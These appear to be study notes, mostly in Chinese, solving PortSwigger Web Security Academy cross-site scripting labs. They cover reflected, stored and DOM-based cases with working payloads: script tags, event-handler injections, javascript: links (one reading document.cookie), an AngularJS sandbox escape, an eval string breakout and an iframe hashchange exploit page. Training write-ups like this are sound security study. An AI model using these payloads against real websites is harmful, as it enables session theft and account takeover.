# Cross-site scripting

## [Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

### 題目解釋
在搜尋功能的反射性 XSS

### 解答
在搜尋上面打

```
<script>alert(1)</script>
```

## [Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 
### 題目解釋
儲存型 XSS 在留言區

### 解答
在留言的 Comment 上面打

```
<script>alert(1)</script>
```

## [Lab: DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋

### 解答
觀察原始碼可以發現

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

這邊有一個 tracking，會塞到 img src 裡面，所以我可以先用 `">` 把它閉合再 XSS

在搜尋輸入
```
"> <script>alert(1)</script>
```


## [Lab: DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋
題目說是 DOM-based 在 innderHTML 裡面

### 解答
搜尋列寫
```html
<img src='' onerror="alert(1)">
```


## [Lab: DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie. 
### 題目解釋
Href 除了跳轉路徑之外，也可以塞 `javascript:alert(1)`
### 解答
先隨便點到一篇文底下，例如

```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/post?postId=1
```

觀察 `Submit feedback` 的連結會變成 `https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=/post`

```javascript=
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

我們知道在 href 裡面塞 `javascript:alert(1)` 可以 alert

所以
```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

然後按下 Back 就可以噴出餅乾了


## [Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 

### 題目解釋
在 jQuery 裡面塞 XSS，他不用管句法的完整性，只要有 html 就會執行了

### 解答

看起來可疑的程式碼在這邊
```
$(window).on('hashchange', function(){
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
```

直接觀察，使用者可控的地方是 `window.location.hash`，也就是網址最後面的 `#`，例如使用
```
https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#Procrastination
```

可以直接跳到 `Procrastination` 的區塊，而其中，用上面的例子
```
window.location.hash.slice(1)
```

會回傳

```
"Procrastination"
```

而在前面有一個 `decodeURIComponent` 會做 URLDecode 的部分，整段他會做一個字串加法，再放到 `$()` 中

字串加法在這邊
```
'section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'
```

經過了一些測試， JQuery 可以直接 parse HTML，而且不會特別去管語法的完整性，也就是說右括號不呱也沒關係，例如這樣就可以 XSS

```
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```

繼續測試發現，甚至這樣也可以
```
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```

所以那就用最簡單的方法，網址打
```
https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src=1%20onerror=alert(1)%3E
```

但需要注意的是他的觸發條件是 `hashchange`，所以我們需要建立一個 iframe 來控制 change 的 src 讓他途中會變動

```html
<script>
    function meow(){
        console.log(document.getElementsByTagName("iframe")[0].src);
      setTimeout(() => {
        document.getElementsByTagName("iframe")[0].src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src%3D1%20onerror%3Dprint%28%29%3E";
        console.log(document.getElementsByTagName("iframe")[0].src);
          }, 
      1000);
    }
</script>

<iframe src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#meow" onload="meow()">
</iframe>
```

## [Lab: Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 
### 題目解釋
不能用 HTML 的角括號，試試看汙染 HTML 的 attribute，用一些事件來構成 XSS

### 解答
發現 如果丟最基本的 XSS
```
https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

會被 HTML Entity 給 Encode

```
<input type=text placeholder='Search the blog...' name=search value="&lt;script&gt;alert(1)&lt;/script&gt;">
```



如果輸入 `123"` 的話，會變成

```
<input type=text placeholder='Search the blog...' name=search value="123"">
```

代表可以用 `"` 關閉 value 的雙引號

使用 `onmouseover` 這個事件，就過了

```
https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=123%22%20onmouseover=%22alert(1)
```

但我覺得沒有很清楚就是他不是打開就會跳 QQ


## [Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
### 題目解釋
href 可以塞 `javascript:alert(1)`

### 解答
觀察留言的地方，送網址會讓使用者出現超連結
```
postId=7&comment=meow&name=aaa&email=meow%40meow.meow&website=http%3A%2F%2Fmeow.com
```

而題目有說如果雙引號會被 URL Encode，而題目又說觸發只需要點下去就好，所以我們不需要跳脫 href，可以直接用
```
javascript:alert(1)
```
就過關ㄌ

## [Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
 
### 題目解釋
不正常的字串串接，直接串到 js 上面，讓 js 爛掉

### 解答

送最簡單的 payload 觀察，發現會把 `<>` 做 Encode，但下面的程式碼明顯就是有洞
```javascript
var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

經過了一些測試發現 `searchTerms` 會直接超級暴力的解字串，無視 js

假設輸入 `'` 則 他會變成 `var searchTerms = '''`

所以就可以構造以下 Payload

```
'+alert(1);//
```

## [Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 

### 題目解釋
觀察原始碼會吃的參數

### 解答
原始碼

```javascript=
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

發現他會吃 storeId 參數，然後進去裡面

```
https://ac721f361f19caf4c02c4c270073000e.web-security-academy.net/product?productId=1&storeId=123</option><script>alert(1)</script>
```

## [Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 
### 題目解釋
AngularJS

### 解答

直接送最普通的會發現被 Encode 了
```
<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
```

Google 找到 Angular 的 XSS 方法在  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) 上

```
{{constructor.constructor('alert(1)')()}}
```

## [Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
### 題目敘述
 This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function. 
### 題目解釋
eval 搭配 Escape 雙引號，但沒有 Escape 反斜線

### 解答

觀察原始碼

```
 <script>search('search-results')</script>
```

```javascript=
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}

```

直覺 `eval('var searchResultsObj = ' + this.responseText);` 很可疑

直接對他下斷點搜尋 `meow` 觀察結果

他的 `this.responseText` 值會是 
```
{"results":[],"searchTerm":"meow"}
```

所以我的 Payload 如果輸入
```
meow"} + alert(1); //
```

他的完整會變成
```
{"results":[],"searchTerm":"meow\"} + alert(1); //"}
```

發現 `meow` 後面的 `"` 被 Escape 了

最終 Payload

```
meow\"} + alert(1); //
```

## [Lab: Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
### 題目敘述
 This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 
### 題目解釋
JS Replace 小特性，只會 Replace 第一個

### 解答

觀察原始碼，重點應該在這邊
```javascript=
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

有一個 JS 的小特性，他的 Replace 只會套用第一個參數
```
"<><>".replace("<",1).replace(">",2) 會回傳 `12<>`
```

所以 Payload

```
<> <img src=1 onerror=alert(1)>
```
